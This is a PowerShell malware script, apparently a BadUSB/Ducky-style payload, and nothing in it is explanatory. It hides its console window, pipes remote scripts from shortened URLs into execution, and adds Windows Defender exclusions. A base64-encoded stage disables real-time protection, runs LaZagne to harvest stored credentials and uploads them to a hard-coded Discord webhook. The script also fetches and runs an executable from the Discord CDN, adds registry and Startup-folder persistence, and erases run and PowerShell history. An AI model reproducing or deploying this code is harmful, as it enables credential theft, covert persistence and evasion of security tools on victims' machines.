Set-ExecutionPolicy unrestricted -Force;
#Hide-Powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetConsoleWindow();
}
"@

$SW_HIDE = 0;
$consolePtr = [User32]::GetConsoleWindow();
[User32]::ShowWindow($consolePtr, $SW_HIDE);

#Disable
irm https://rb.gy/vrt4s6 | iex;
Start-Sleep -Seconds 5;

#Ducky-Exfil
irm https://rb.gy/xzpj1d | iex;

#Exclusions
Set-ExecutionPolicy Unrestricted -Force;  Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe";

#Lasania
$webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
$version = "2.4.6";
$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW4gPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KJEFkbWluID0gJElzQWRtaW4uSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGRpciA9ICIkZW52OnRlbXBcSkhrbmZ1aUQiDQppZiAoIShUZXN0LVBhdGggLVBhdGggIiRkaXIiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGRpciINCn0NCmlmICgtbm90ICR2ZXJzaW9uKSB7DQogICR2ZXJzaW9uID0gIjIuNC41Ig0KfQ0KJGxvZyA9ICIkZGlyXG91dHB1dC50eHQiDQokbmV4dGRvb3IgPSAiZ2l0aHViLmNvbSINCiR2ZXJtID0gInYkdmVyc2lvbiINCiRjdXBpZCA9ICJUaGUgTEFaeSBtYWpvciB3YXMgZml4aW5nIEN1cGlk4oCZcyBicm9rZW4gcXVpdmVyLiINCiRsYXp5ID0gIlF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZy4iDQokZXggPSAiLmV4ZSINCiRhID0gIjoiDQokYiA9ICIvIg0KJGMgPSAkY3VwaWQuU3Vic3RyaW5nKDEsMSkNCiRkID0gJGxhenkuU3Vic3RyaW5nKDI3LDEpDQokZSA9ICRjdXBpZC5TdWJzdHJpbmcoMjgsMSkNCiRmID0gJGN1cGlkLlN1YnN0cmluZygxNywxKQ0KJGcgPSAkY3VwaWQuU3Vic3RyaW5nKDUsMSkNCiRoID0gJGxhenkuU3Vic3RyaW5nKDMxLDEpDQokaSA9ICRjdXBpZC5TdWJzdHJpbmcoMiwxKQ0KJGogPSAkbGF6eS5TdWJzdHJpbmcoMzIsMSkNCiRrID0gJGxhenkuU3Vic3RyaW5nKDEwLDEpDQokbCA9ICRjdXBpZC5TdWJzdHJpbmcoMzAsMSkNCiRtID0gJGxhenkuU3Vic3RyaW5nKDcsMSkNCiRuID0gJGxhenkuU3Vic3RyaW5nKDgsMSkNCiRvID0gJGN1cGlkLlN1YnN0cmluZyg2LDEpDQokcCA9ICRjdXBpZC5TdWJzdHJpbmcoNCwxKQ0KJHEgPSAkY3VwaWQuU3Vic3RyaW5nKDI0LDEpDQokciA9ICRsYXp5LlN1YnN0cmluZyg5LDEpDQokZGVtb24gPSAiJGMkZCRkJGUkZiRhJGIkYiRuZXh0ZG9vciRiIg0KJGFuZ2VsID0gIiRnJGgkaSRmJGYkaiRrJGwkbSRuJG8kYiRwJGokbyRqJHEkayRpJGIkbSRpJGgkaSRqJGYkaSRmJGIkbCRuJHIkayRoJG4kaiRsJGIiDQokaHVtYW4gPSAiJHZlcm0kYiRwJGokbyRqJHEkayRpJGV4Ig0KJHplbGRhID0gIiRkZW1vbiRhbmdlbCRodW1hbiIgfCBPdXQtU3RyaW5nDQpXcml0ZS1Ib3N0ICR6ZWxkYQ0KaWYgKCRBZG1pbiAtZXEgJ1RydWUnKSB7DQogIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUNCg0KICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICIkZGlyIg0KfQ0KJGhpZGUgPSBHZXQtSXRlbSAiJGRpciIgLUZvcmNlDQokaGlkZS5hdHRyaWJ1dGVzPSdIaWRkZW4nDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICIkemVsZGEiIC1PdXRGaWxlICIkZGlyXGxhemFnbmUuZXhlIg0KJiAiJGRpclxsYXphZ25lLmV4ZSIgYWxsID4gIiRsb2ciDQpjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpDb21wdXRlck5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIk5ldyBGaWxlIFVwbG9hZGVkYCFcbihBZG1pbjogJEFkbWluKSBcYCJ9IiAtRiAiZmlsZT1AXGAiJGxvZ1xgIiIgJHdlYmhvb2sgPiRudWxsIDI+JjENClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIwDQppZiAoJEFkbWluIC1lcSAnVHJ1ZScpew0KICBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICRmYWxzZQ0KDQogIFJlbW92ZS1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggIiRkaXIiDQp9DQokdW5oaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KJHVuaGlkZS5hdHRyaWJ1dGVzPSdOb3JtYWwnDQpSZW1vdmUtSXRlbSAtUGF0aCAiJGRpciIgLVJlY3Vyc2UgLUZvcmNl > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"

#Disto
Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269444822612181054/distopan.exe?ex=66b0161e&is=66aec49e&hm=1e4d002fc89f532ae6b53f298bcacf892700f1e8137fa1f43cafcab59bdd8591&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";

# Función para agregar persistencia mediante el registro de Windows
function Add-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "DistopiaPersistence"
    $value = "$env:TEMP\distopi.exe"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $name -Value $value
}

# Función para agregar persistencia mediante la carpeta de inicio
function Add-StartupFolderPersistence {
    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\distopi.lnk")
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($startupPath)
    $shortcut.TargetPath = "$env:TEMP\distopi.exe"
    $shortcut.Save()
}

# Llamada a las funciones para agregar persistencia
Add-RegistryPersistence
Add-StartupFolderPersistence


Start-Sleep -Seconds 5;

# 1delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f ;

# 1Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue;

# 1Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;

#Last discord kill before quit
taskkill /IM Discord.exe /F;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
  
exit;
